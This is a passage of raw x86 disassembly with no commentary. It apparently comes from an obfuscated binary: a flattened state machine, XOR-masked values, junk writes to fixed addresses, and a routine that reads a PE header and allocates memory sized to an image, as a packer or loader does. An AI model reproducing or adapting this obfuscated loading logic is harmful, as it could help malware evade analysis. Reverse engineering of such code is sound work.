  42877f:	mov    cl,BYTE PTR [ebp+ecx*1+0x3272a5]
  428786:	xor    al,cl
  428788:	mov    ecx,DWORD PTR [ebp-0x10]
  42878b:	mov    ecx,DWORD PTR [ecx]
  42878d:	xor    ecx,edi
  42878f:	mov    cl,BYTE PTR [ebp+ecx*1+0x3272a5]
  428796:	or     al,cl
  428798:	mov    ecx,DWORD PTR [ebp-0x14]
  42879b:	mov    ecx,DWORD PTR [ecx]
  42879d:	xor    ecx,edi
  42879f:	mov    cl,BYTE PTR [ebp+ecx*1+0x3272a9]
  4287a6:	cmp    cl,al
  4287a8:	jne    0x4287ba
  4287aa:	lea    eax,[ebp-0x4c]
  4287ad:	push   eax
  4287ae:	call   0x428275
  4287b3:	mov    ecx,DWORD PTR [ebp-0x44]
  4287b6:	cmp    eax,ecx
  4287b8:	je     0x4287c4
  4287ba:	mov    eax,DWORD PTR [ebp+0x8]
  4287bd:	xor    eax,edi
  4287bf:	add    eax,ebx
  4287c1:	mov    DWORD PTR [ebp+0x18],eax
  4287c4:	mov    eax,DWORD PTR [ebp-0x8]
  4287c7:	xor    eax,edi
  4287c9:	lea    eax,[eax+esi*1+0x3272f1]
  4287d0:	xor    eax,edi
  4287d2:	mov    ecx,DWORD PTR [ebp+0x8]
  4287d5:	mov    edx,DWORD PTR [ebp+0x18]
  4287d8:	xor    ecx,edi
  4287da:	add    ecx,ebx
  4287dc:	cmp    edx,ecx
  4287de:	je     0x4285db
  4287e4:	mov    eax,DWORD PTR [ebp+0x8]
  4287e7:	mov    ecx,DWORD PTR [ebp+0x18]
  4287ea:	xor    eax,edi
  4287ec:	add    eax,ebx
  4287ee:	cmp    ecx,eax
  4287f0:	jne    0x428803
  4287f2:	mov    eax,DWORD PTR [ebp-0x8]
  4287f5:	mov    ecx,DWORD PTR [ebp+0x1c]
  4287f8:	xor    eax,edi
  4287fa:	lea    eax,[eax+ecx*1+0x3272f1]
  428801:	jmp    0x42887a
  428803:	push   0x18
  428805:	push   DWORD PTR [ebp-0x4]
  428808:	lea    eax,[ebp-0x64]
  42880b:	push   eax
  42880c:	call   0x427af1
  428811:	mov    eax,DWORD PTR [ebp+0x8]
  428814:	mov    ecx,DWORD PTR [ebp-0x18]
  428817:	xor    eax,edi
  428819:	add    eax,ebx
  42881b:	cmp    eax,ecx
  42881d:	je     0x428832
  42881f:	mov    eax,DWORD PTR [ebp+0x8]
  428822:	xor    eax,edi
  428824:	add    eax,ebx
  428826:	push   eax
  428827:	push   0x18
  428829:	lea    eax,[ebp-0x64]
  42882c:	push   eax
  42882d:	call   0x4280d6
  428832:	mov    eax,DWORD PTR [ebp-0x4]
  428835:	add    eax,0x18
  428838:	mov    DWORD PTR [ebp+0x18],eax
  42883b:	push   DWORD PTR [ebp-0x50]
  42883e:	push   DWORD PTR [ebp+0x18]
  428841:	mov    eax,DWORD PTR [ebp-0x54]
  428844:	add    eax,DWORD PTR [ebp-0x20]
  428847:	push   eax
  428848:	call   0x427af1
  42884d:	mov    eax,DWORD PTR [ebp+0x8]
  428850:	mov    ecx,DWORD PTR [ebp-0x18]
  428853:	xor    eax,edi
  428855:	add    eax,ebx
  428857:	cmp    eax,ecx
  428859:	je     0x42886c
  42885b:	push   0x0
  42885d:	push   DWORD PTR [ebp-0x50]
  428860:	mov    eax,DWORD PTR [ebp-0x54]
  428863:	add    eax,DWORD PTR [ebp-0x20]
  428866:	push   eax
  428867:	call   0x4280d6
  42886c:	mov    eax,DWORD PTR [ebp-0x24]
  42886f:	mov    ecx,DWORD PTR [ebp-0x50]
  428872:	add    DWORD PTR [eax],ecx
  428874:	mov    eax,DWORD PTR [ebp-0x50]
  428877:	add    eax,DWORD PTR [ebp+0x1c]
  42887a:	mov    DWORD PTR [ebp+0x1c],eax
  42887d:	mov    eax,DWORD PTR [ebp-0x8]
  428880:	mov    ecx,DWORD PTR [ebp+0x1c]
  428883:	xor    eax,edi
  428885:	add    eax,ebx
  428887:	imul   eax,ecx
  42888a:	mov    ecx,DWORD PTR [ebp+0x8]
  42888d:	mov    edx,DWORD PTR [ebp-0x28]
  428890:	xor    ecx,edi
  428892:	lea    ecx,[ecx+edx*1+0x3272f1]
  428899:	cmp    eax,ecx
  42889b:	jb     0x4284f9
  4288a1:	mov    esi,DWORD PTR [ebp+0x14]
  4288a4:	mov    eax,DWORD PTR [ebp-0x20]
  4288a7:	mov    DWORD PTR [esi],eax
  4288a9:	jmp    0x4288f0
  4288ab:	mov    ecx,DWORD PTR [ebp+0x8]
  4288ae:	mov    edx,DWORD PTR [ebp+0xc]
  4288b1:	xor    ecx,edi
  4288b3:	xor    edx,edi
  4288b5:	add    ecx,ebx
  4288b7:	add    edx,ebx
  4288b9:	cmp    ecx,edx
  4288bb:	jne    0x4288cf
  4288bd:	mov    eax,ds:0x7f642ddc
  4288c2:	imul   eax,eax,0x9f15fccf
  4288c8:	mov    ds:0x7f642ddc,eax
  4288cd:	jmp    0x4288f0
  4288cf:	mov    ecx,DWORD PTR [ebp+0x8]
  4288d2:	xor    ecx,edi
  4288d4:	add    ecx,ebx
  4288d6:	cmp    eax,ecx
  4288d8:	je     0x4288e6
  4288da:	sub    DWORD PTR ds:0xf861e3c,0x709beac4
  4288e4:	jmp    0x4288f0
  4288e6:	and    DWORD PTR ds:0x3343fadc,0x5265ec3f
  4288f0:	pop    edi
  4288f1:	pop    esi
  4288f2:	pop    ebx
  4288f3:	leave  
  4288f4:	ret    0x18
  4288f7:	push   ebp
  4288f8:	mov    ebp,esp
  4288fa:	and    esp,0xfffffff8
  4288fd:	mov    eax,DWORD PTR [ebp+0x20]
  428900:	sub    esp,0x14
  428903:	push   ebx
  428904:	mov    ebx,DWORD PTR [ebp+0x14]
  428907:	push   esi
  428908:	push   edi
  428909:	cmp    eax,0xf89c85a5
  42890e:	jne    0x42891a
  428910:	push   0xf89c85ba
  428915:	jmp    0x428a4c
  42891a:	mov    eax,DWORD PTR [ebp+0x20]
  42891d:	cmp    eax,0xf89c85ba
  428922:	jne    0x42892e
  428924:	push   0xf89c85bb
  428929:	jmp    0x428a4c
  42892e:	mov    eax,DWORD PTR [ebp+0x20]
  428931:	cmp    eax,0xf89c85bb
  428936:	jne    0x428942
  428938:	push   0xf89c85b8
  42893d:	jmp    0x428a4c
  428942:	mov    eax,DWORD PTR [ebp+0x20]
  428945:	cmp    eax,0xf89c85b8
  42894a:	jne    0x428956
  42894c:	push   0xf89c85b9
  428951:	jmp    0x428a4c
  428956:	mov    ecx,DWORD PTR [ebp+0x20]
  428959:	mov    eax,0xf89c85bc
  42895e:	cmp    ecx,eax
  428960:	jne    0x428a1c
  428966:	mov    eax,DWORD PTR [ebp+0x10]
  428969:	mov    DWORD PTR [esp+0xc],eax
  42896d:	mov    eax,DWORD PTR [ebp+0x18]
  428970:	mov    DWORD PTR [esp+0x14],eax
  428974:	mov    eax,DWORD PTR [ebp+0xc]
  428977:	mov    DWORD PTR [esp+0x18],eax
  42897b:	mov    eax,DWORD PTR [ebp+0x8]
  42897e:	mov    DWORD PTR [esp+0x10],eax
  428982:	mov    eax,DWORD PTR [esp+0x10]
  428986:	mov    ecx,DWORD PTR [esp+0x14]
  42898a:	mov    edi,0x75108aa
  42898f:	xor    eax,edi
  428991:	mov    esi,0x3272f1
  428996:	add    eax,esi
  428998:	mov    DWORD PTR [ecx],eax
  42899a:	mov    eax,DWORD PTR [esp+0xc]
  42899e:	mov    eax,DWORD PTR [eax+0x194]
  4289a4:	mov    ecx,DWORD PTR [eax]
  4289a6:	mov    eax,DWORD PTR [esp+0xc]
  4289aa:	mov    eax,DWORD PTR [eax+0x194]
  4289b0:	mov    eax,DWORD PTR [eax]
  4289b2:	add    eax,DWORD PTR [ecx+0x3c]
  4289b5:	mov    ecx,DWORD PTR [esp+0xc]
  4289b9:	mov    ecx,DWORD PTR [ecx+0x1e0]
  4289bf:	mov    ecx,DWORD PTR [ecx+0x14]
  4289c2:	push   0x4
  4289c4:	push   0x3000
  4289c9:	push   DWORD PTR [eax+0x50]
  4289cc:	push   0x0
  4289ce:	call   ecx
  4289d0:	mov    DWORD PTR [ebx],eax
  4289d2:	mov    eax,DWORD PTR [esp+0x10]
  4289d6:	push   DWORD PTR [esp+0xc]
  4289da:	xor    eax,edi
  4289dc:	add    eax,esi
  4289de:	mov    DWORD PTR [esp+0x20],eax
  4289e2:	lea    eax,[esp+0x20]
  4289e6:	push   eax
  4289e7:	push   ebx
  4289e8:	push   DWORD PTR [esp+0x20]
  4289ec:	push   DWORD PTR [esp+0x28]
  4289f0:	push   DWORD PTR [esp+0x24]
  4289f4:	call   0x4283b9
  4289f9:	mov    eax,DWORD PTR [esp+0x10]
  4289fd:	mov    ecx,DWORD PTR [ebx]
  4289ff:	xor    eax,edi
  428a01:	add    eax,esi
  428a03:	cmp    ecx,eax
  428a05:	je     0x428a63
  428a07:	mov    eax,DWORD PTR [esp+0x18]
  428a0b:	mov    ecx,DWORD PTR [esp+0x14]
  428a0f:	xor    eax,edi
  428a11:	add    eax,esi
  428a13:	imul   eax,DWORD PTR [esp+0x1c]
  428a18:	mov    DWORD PTR [ecx],eax
  428a1a:	jmp    0x428a63
  428a1c:	mov    ecx,DWORD PTR [ebp+0x20]
  428a1f:	cmp    ecx,0xf89c85b9
  428a25:	jne    0x428a2e
  428a27:	push   0xf89c85be
  428a2c:	jmp    0x428a4c
  428a2e:	mov    ecx,DWORD PTR [ebp+0x20]
  428a31:	cmp    ecx,0xf89c85be
  428a37:	jne    0x428a40
  428a39:	push   0xf89c85bf
  428a3e:	jmp    0x428a4c
  428a40:	mov    ecx,DWORD PTR [ebp+0x20]
  428a43:	cmp    ecx,0xf89c85bf
  428a49:	jne    0x428a63
  428a4b:	push   eax
  428a4c:	push   DWORD PTR [ebp+0x1c]
  428a4f:	push   DWORD PTR [ebp+0x18]
  428a52:	push   ebx
  428a53:	push   DWORD PTR [ebp+0x10]
  428a56:	push   DWORD PTR [ebp+0xc]
  428a59:	push   DWORD PTR [ebp+0x8]
  428a5c:	call   0x4288f7
  428a61:	mov    DWORD PTR [ebx],eax
  428a63:	mov    eax,DWORD PTR [ebx]
  428a65:	pop    edi
  428a66:	pop    esi
  428a67:	pop    ebx
  428a68:	mov    esp,ebp
  428a6a:	pop    ebp
  428a6b:	ret    0x1c
  428a6e:	push   ebp
  428a6f:	mov    ebp,esp
  428a71:	sub    esp,0xc
  428a74:	mov    eax,0xf89c85a5
  428a79:	mov    DWORD PTR [ebp-0x8],eax
  428a7c:	mov    DWORD PTR [ebp-0xc],0xf89c85ba
  428a83:	mov    ecx,DWORD PTR [ebp-0x8]
  428a86:	xor    ecx,0x75108aa
  428a8c:	add    ecx,0x3272f1
  428a92:	mov    DWORD PTR [ebp-0x4],ecx
  428a95:	mov    ecx,DWORD PTR [ebp+0xc]
  428a98:	push   eax
  428a99:	mov    DWORD PTR [ebp+0xc],ecx
  428a9c:	push   DWORD PTR [ebp+0xc]
  428a9f:	lea    eax,[ebp-0x4]
  428aa2:	push   DWORD PTR [ebp+0x8]
  428aa5:	push   eax
  428aa6:	push   DWORD PTR [ebp+0xc]
  428aa9:	push   DWORD PTR [ebp-0xc]
  428aac:	push   DWORD PTR [ebp-0x8]
  428aaf:	call   0x4288f7
  428ab4:	mov    DWORD PTR [ebp-0x4],eax
  428ab7:	mov    eax,DWORD PTR [ebp-0x4]
  428aba:	leave  
  428abb:	ret    0x8
